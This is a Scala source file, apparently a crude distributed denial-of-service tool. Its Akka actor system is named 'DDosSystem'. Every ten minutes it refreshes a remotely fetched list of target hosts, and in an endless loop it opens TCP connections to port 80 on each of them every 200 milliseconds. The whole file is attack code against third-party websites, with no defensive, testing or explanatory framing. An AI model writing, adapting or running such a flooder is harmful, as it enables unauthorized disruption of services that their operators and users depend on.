package hi

import akka.actor.{Actor, ActorSystem, Props}
import hi.Test.{fetchTargets, file, lastUpdate}

import java.net.{InetSocketAddress, Socket, UnknownHostException}

object Sync {

  def main(args: Array[String]): Unit = {
    val system = ActorSystem("DDosSystem")
    val actor = system.actorOf(Props[DosActor], name = "ddosactor")

    var targets = fetchTargetsHost

    val REFRESH_TIME: Int = 10 * 60 * 1000
    var lastUpdate: Long = System.currentTimeMillis()


    while (true) {
      if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
        targets = fetchTargetsHost
        println(s"list updated. size=${file.size}")
        lastUpdate = System.currentTimeMillis()
      }

      targets foreach {
        actor ! HostPort(_, 80)
      }

      Thread.sleep(200)
    }
  }

  def fetchTargetsHost: Seq[String] = {
    Test.fetchTargets.map(_.split("://")(1)).map(_.split("/").head)
  }

  case class HostPort(ip: String, port: Int)

  class DosActor extends Actor {
    def receive = {
      case hp: HostPort =>
        var s: Socket = null
        try {
          s = new Socket()
          s.connect(new InetSocketAddress(hp.ip, hp.port), 2500)
          Thread.sleep(100)
          s.close()
          println(s"Send to the $hp")
        } catch {
          case _: UnknownHostException =>
            println(s"UnknownHostException for the $hp")

          case error =>
            println(s"$error for the $hp")
        } finally {
          s.close()
        }

      case _       =>
        println("huh?")
    }
  }

}
